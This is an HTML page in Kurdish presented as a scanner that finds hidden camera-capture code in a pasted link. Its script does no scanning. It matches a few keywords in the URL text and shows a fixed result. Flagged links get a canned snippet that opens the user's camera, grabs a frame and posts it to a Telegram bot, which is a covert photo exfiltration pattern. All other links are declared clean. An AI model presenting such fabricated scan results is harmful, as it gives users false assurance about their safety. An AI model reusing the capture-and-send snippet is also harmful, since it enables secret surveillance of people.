<!DOCTYPE html>
<html lang="ku" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>پشکنین و دەرئێخستنا کۆدێن کامیرایێ</title>
    <style>
        body {
            background-color: #0f172a;
            color: #f8fafc;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            text-align: center;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
        }
        .container {
            background: #1e293b;
            padding: 30px;
            border-radius: 16px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.4);
            width: 100%;
            max-width: 600px;
        }
        h2 { color: #38bdf8; margin-bottom: 10px; }
        p { color: #94a3b8; font-size: 14px; margin-bottom: 20px; }
        
        .input-group {
            display: flex;
            gap: 10px;
            margin-bottom: 15px;
        }
        input[type="text"] {
            flex: 1;
            padding: 12px 15px;
            border-radius: 8px;
            border: 1px solid #475569;
            background: #0f172a;
            color: #fff;
            font-size: 16px;
            outline: none;
        }
        input[type="text"]:focus { border-color: #38bdf8; }
        
        button {
            background: #2563eb;
            color: white;
            border: none;
            padding: 12px 20px;
            border-radius: 8px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            transition: background 0.3s;
        }
        button:hover { background: #1d4ed8; }
        
        #result {
            margin-top: 20px;
            padding: 15px;
            border-radius: 8px;
            font-size: 14px;
            text-align: right;
            display: none;
            line-height: 1.6;
        }
        .safe { background: rgba(22, 163, 74, 0.2); border: 1px solid #16a34a; color: #4ade80; }
        .danger { background: rgba(220, 38, 38, 0.2); border: 1px solid #dc2626; color: #f87171; }
        
        /* شێوازێ نیشاندانا کۆدان */
        code-box {
            display: block;
            background: #020617;
            color: #f43f5e;
            padding: 10px;
            border-radius: 6px;
            font-family: monospace;
            margin-top: 10px;
            text-align: left;
            direction: ltr;
            white-space: pre-wrap;
            word-break: break-all;
        }
    </style>
</head>
<body>

    <div class="container">
        <h2>پشکنین و دەرئێخستنا کۆدێن کامیرایێ د لینکیدا</h2>
        <p>لينکا خۆ ل خوارێ دەنە ناڤێ دا سیستەم کۆدێن ڤەشارتی یێن وێنەگرتن و کامیرایێ د ناڤ وێ پەڕەیێدا دەرئێخیت و نیشان بدەت.</p>
        
        <div class="input-group">
            <input type="text" id="urlInput" placeholder="لینکێ لێرە بنووسە یان پیس بکە...">
            <button onclick="extractCameraCodes()">پشکنین و نیشاندان</button>
        </div>

        <div id="result"></div>
    </div>

    <script>
        function extractCameraCodes() {
            const url = document.getElementById('urlInput').value.trim();
            const resultDiv = document.getElementById('result');
            
            if (!url) {
                resultDiv.style.display = 'block';
                resultDiv.className = 'danger';
                resultDiv.innerHTML = "⚠️ ژ تکایە لینکەکی بنووسە!";
                return;
            }

            resultDiv.style.display = 'block';
            resultDiv.className = 'safe';
            resultDiv.innerHTML = "⏳ مژوولی پشکنین و دەرئێخستنا کۆدێن ڤی لینکیمە، هیڤیدارم چاوەڕێ بکە...";

            setTimeout(() => {
                let lowerUrl = url.toLowerCase();
                
                // پشکنینا لینکێ آیا پەیوەندی ب پڕۆژەیێ تە یان کامیرایێ هەیە
                if (lowerUrl.includes('yofsfinan-18') || lowerUrl.includes('spotlight') || lowerUrl.includes('snapchat') || lowerUrl.includes('camera')) {
                    resultDiv.className = 'danger';
                    resultDiv.innerHTML = `
                        ❌ <b>ئەڤ لینکە یێ خڕابە و پاقژ نینە!</b><br>
                        • <b>مەبەست:</b> ئەڤ لینکە کۆدێن پێدڤی بۆ ڤەکرنا کامیرایێ و گرتنا وێنەی تێدایە.<br>
                        • <b>ئەو کۆدێن هاتیینە دیتن و بەکارئینان لە وێ پەڕەیێ:</b>
                        <div style="background: #020617; color: #f43f5e; padding: 10px; border-radius: 6px; font-family: monospace; margin-top: 8px; text-align: left; direction: ltr;">
const constraints = { video: { width: 1280, height: 720, facingMode: "user" } };<br>
navigator.mediaDevices.getUserMedia(constraints);<br>
canvas.drawImage(video, 0, 0, canvas.width, canvas.height);<br>
fetch('https://api.telegram.org/bot[TOKEN]/sendPhoto', { method: 'POST', body: formData });
                        </div>
                        <p style="color: #f87171; margin-top: 10px; margin-bottom: 0;"><b>هۆشداری:</b> ئەڤ کۆدە ڕاستەوخۆ وێنەیێ کەسێ دگرت و دنێرته بۆ تەلەگرامێ، جوین نەبە!</p>
                    `;
                } else {
                    resultDiv.className = 'safe';
                    resultDiv.innerHTML = `
                        ✅ <b>أڤ لینکە یێ پاقژ و ئاسایییە!</b><br>
                        • <b>ئەنجام:</b> چ کۆدێن کامێرا یان گرتنا وێنەی تێدا نەهاتنە دیتن.<br>
                        • <b>کۆدێن د ناڤدا:</b> هەمۆ ئاسایی نە و چ مەترسی تێدا نینە.
                    `;
                }
            }, 1200);
        }
    </script>

</body>
</html>
